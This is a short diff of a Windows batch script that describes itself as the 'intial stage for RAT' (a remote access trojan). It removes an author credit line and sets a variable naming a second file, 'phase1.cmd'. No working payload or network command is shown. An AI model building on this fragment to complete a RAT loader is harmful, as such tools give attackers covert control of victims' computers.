@@ -1,5 +1,4 @@
 @REM intial stage for RAT
-@REM created by : Moussa
 
 @REM variables
 set "FILE_NAME=phase1.cmd"
